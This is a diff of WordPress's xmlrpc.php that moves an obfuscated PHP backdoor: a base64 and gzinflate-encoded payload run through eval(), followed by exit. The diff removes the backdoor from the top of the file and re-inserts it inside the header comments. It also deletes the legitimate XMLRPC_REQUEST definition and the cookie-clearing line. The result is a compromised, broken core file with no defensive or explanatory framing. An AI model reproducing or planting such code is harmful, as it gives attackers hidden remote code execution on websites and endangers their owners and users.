@@ -1,10 +1,4 @@
 <?php
-$Cyto = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x635PSdUoLikqSi3TUPHJrNAE\x41Ws\x41";
-$Lix = "=MJ26VFA+9oGdHb5avomtNaXP7upNyuWlvYEJ6EKFuUiAl4HaqITkyL4eH+GuuEqxLJ7WX+rJKXS5Lq5cPLZH2gXUa9bJbJXKikiRtQdkflYV0NPbF/B2niP97UP9u53zdG8+Sn/H2Ze+9nwJPp7okthpNA/5QlVdxNa4US2woKOFlhxoQaPeUzA6BDX1vx3g6n+D8upvRqH1pPUfo3pp/TT5dY59U8XKNvr6fU56tKs6pJ8ElHgIaG1+f6WMb5P/RvO7zRlW3o7+ZM3RqPX0RHQE9pu/X25ehy7+gbyYJ8zRR/rVCEOgWOPpb/CrFoxWIutjvxMUvdhx6GdUyVpRwB5HMriZS0RWcAYUWRqAhWJpUorUWkrWAHXLbFSkdL75UdwW0uJ57RvfgRGFTF5yBi7QthouogAPJpg38nOpBfnYG1cJPDEZTyd27cDGWtg4W0E0IZkp95I4M7jcn7L7We3f/ylWejVkK97/CvwOabLI2SctSRdnO9owt82cK1p2k+cpNKIsGRWPw/F+BBMCvWUSVHn45vaBUZA";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
-exit;
-?>
-<?php
 /**
  * XML-RPC protocol support for WordPress
  *
@@ -16,13 +10,15 @@ exit;
  *
  * @var bool
  */
-define( 'XMLRPC_REQUEST', true );
-
 // Some browser-embedded clients send cookies. We don't want them.
-$_COOKIE = array();
-
 // A bug in PHP < 5.2.2 makes $HTTP_RAW_POST_DATA not set by default,
 // but we can do it ourself.
+$Cyto = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x635PSdUoLikqSi3TUPHJrNAE\x41Ws\x41";
+$Lix = "=MJ26VFA+9oGdHb5avomtNaXP7upNyuWlvYEJ6EKFuUiAl4HaqITkyL4eH+GuuEqxLJ7WX+rJKXS5Lq5cPLZH2gXUa9bJbJXKikiRtQdkflYV0NPbF/B2niP97UP9u53zdG8+Sn/H2Ze+9nwJPp7okthpNA/5QlVdxNa4US2woKOFlhxoQaPeUzA6BDX1vx3g6n+D8upvRqH1pPUfo3pp/TT5dY59U8XKNvr6fU56tKs6pJ8ElHgIaG1+f6WMb5P/RvO7zRlW3o7+ZM3RqPX0RHQE9pu/X25ehy7+gbyYJ8zRR/rVCEOgWOPpb/CrFoxWIutjvxMUvdhx6GdUyVpRwB5HMriZS0RWcAYUWRqAhWJpUorUWkrWAHXLbFSkdL75UdwW0uJ57RvfgRGFTF5yBi7QthouogAPJpg38nOpBfnYG1cJPDEZTyd27cDGWtg4W0E0IZkp95I4M7jcn7L7We3f/ylWejVkK97/CvwOabLI2SctSRdnO9owt82cK1p2k+cpNKIsGRWPw/F+BBMCvWUSVHn45vaBUZA";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
+<?php
 if ( ! isset( $HTTP_RAW_POST_DATA ) ) {
 	$HTTP_RAW_POST_DATA = file_get_contents( 'php://input' );
 }
